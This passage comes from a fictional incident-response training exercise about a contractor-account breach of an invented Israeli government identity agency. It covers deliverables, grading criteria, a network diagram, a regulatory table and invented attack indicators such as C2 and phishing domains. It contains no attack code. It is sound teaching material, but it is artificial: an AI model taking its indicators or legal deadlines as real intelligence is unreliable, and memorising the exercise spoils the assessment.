   - What worked (PAM session recording; VPN anomaly eventually detected; BDA notification on time)
   - Timeline of decision-making under pressure

2. Produce a **Priority Remediation Backlog** with 10 items, each containing:
   - Item ID, Title, Description
   - Root cause addressed
   - Estimated effort (person-days)
   - Urgency (Critical/High/Medium)
   - Owner (NDSA CISO / NDSA SOC / HavayaIT / INCD coordination)
   - Success criteria

3. Write an **Inter-Agency Coordination Protocol** recommendation (2 pages):
   - How should classified INCD advisories be shared internally within NDSA without compromising their classification? (Propose a tiered read-in model)
   - How should NDSA and INCD conduct parallel forensics without evidence custody conflicts?
   - How should HavayaIT's cross-agency compromise scope be coordinated across ITA, MoI, and NDSA without creating an uncontrolled information flow?

4. Address the **contractor security gap**: HavayaIT's MFA exception policy and TOTP seed storage in personal email represent vendor security failures. Write a **vendor security assessment requirement** — what minimum security controls must NDSA verify for all contractors with privileged access, and what contractual remedy should NDSA invoke against HavayaIT for the MFA failure?

---

## Section 4: Deliverables Summary

| # | Deliverable | Audience | Format | Page Limit |
|---|---|---|---|---|
| 1 | Multi-host incident timeline (35+ events) | IR Team, INCD | Table + analyst narrative | — |
| 2 | ATT&CK mapping table (12+ techniques) | SOC, Detection Engineering | Table + analyst notes | — |
| 3 | Threat Actor Assessment with attribution statement | CISO, INCD | Structured report | 6 pages |
| 4 | 5 Sigma detection rules + 5 KQL queries | Detection Engineering | YAML + KQL | — |
| 5 | Regulatory obligation matrix | Legal, DG | Table + compliance narrative | — |
| 6 | Draft INCD-CID preliminary notification | Legal, INCD Liaison | Formatted notification | 2 pages |
| 7 | Legal risk memo | General Counsel | Memo | 2 pages |
| 8 | Affected individual analysis + notification letter | Legal, Comms | Report + draft letter | — |
| 9 | Lessons learned report | DG, CISO | Formal report | 4 pages |
| 10 | Priority remediation backlog (10 items) | CISO, Program | Table | — |
| 11 | Executive summary for Knesset committee | DG, Minister's Office | Plain language | 1 page |

---

## Section 5: Assessment Criteria

| Criterion | Weight | What Examiners Look For |
|---|---|---|
| Forensic rigor (timeline, gap handling) | 20% | Completeness, explicit confidence levels, gap documentation |
| ATT&CK accuracy and detection analysis | 15% | Correct technique mapping, honest gap identification |
| Attribution discipline | 15% | No overconfidence; evidence-driven; model statements |
| Regulatory compliance analysis | 20% | Accuracy on Israeli law; dual-track management; timeline precision |
| Detection engineering quality | 15% | Working Sigma rules; KQL correctness; architectural thinking |
| Communication quality | 15% | Executive summary suitable for ministerial briefing; legal memo precision |

---

## Appendix A: NDSA Network Diagram (Simplified)

```
Internet
    |
[Palo Alto NGFW]
    |
[Contractor DMZ VLAN]
    |__ JUMPHOST-CONTRACTOR-01 (10.10.5.10)
    |__ JUMPHOST-CONTRACTOR-02 (10.10.5.11) [HavayaIT — network maintenance only]
    |
[GOVNET Operational Segment]
    |__ VRID-SRV-01 (10.20.15.44) [eID Verification Server]
    |__ MIB-SRV-01 (10.20.15.50) [Ministry Integration Bus]
    |__ ONEGOV-WEB-01 (10.20.15.60) [OneGov Portal frontend]
    |
[Data Diode (unidirectional, inbound only)]
    |
[GOVNET Classified Segment]
    |__ VRID-CLASS-SRV-01 [Classified biometric registry]
    |__ CLEARANCE-SRV-01 [Security clearance linkage DB]
    |__ [Elastic SIEM on-premise — logs NOT accessible without MATZBEN clearance]
```

---

## Appendix B: Reference — Israeli Regulatory Framework Summary

| Regulation | Authority | Key Incident Obligation | Deadline |
|---|---|---|---|
| INCD-CID Section 7 | INCD | Notification of CII breach | 8 hours |
| Biometric Database Law (5769-2009) | BDA | Notification + 24h report + 30-day full report | 8 hours / 24 hours / 30 days |
| Privacy Protection Law (PPL) | PPA | Notification of significant personal data breach | 72 hours (PPA) + individual notification |
| MATZBEN Sec. 14 | PMO / Shabak | Classified system incident reporting | 4 hours (classified breach) |

---

## Appendix C: Indicator Summary

| Indicator | Type | Confidence | Attribution Note |
|---|---|---|---|
| 203.0.113.115 | Source IP (attacker VPN) | High | Turkish residential VPN exit; ClearSky-linked IP cluster |
| 203.0.113.201 | C2 IP | High | Sole C2 for exfil; hosted AS not attributable without further investigation |
| govservice-cdn-updates[.]net | C2 Domain | High | Lookalike domain; registration details to be developed via OSINT |
| gov-procurement-il-portal[.]net | Phishing Domain | High | Lookalike of fictitious government procurement portal |
| SVC-HAVAYAIT-MAINT | Compromised Account | Confirmed | Halevi's NDSA maintenance service account |
| C:\Windows\Temp\svchost.exe | Malware path | Confirmed | Non-standard path; deployed via BITS |
| SvcHostMonitor | Malware service name | Confirmed | Persistence mechanism |
| vrid_query.exe full-table SELECT | Anomalous query | Confirmed | Legitimate tool, misused |

---

*This scenario is fictional and designed for educational use in CTI and DFIR training environments. All individuals, organizations, IP addresses, and domain names are invented. No real Israeli government system, individual, or organization is referenced or implied.*
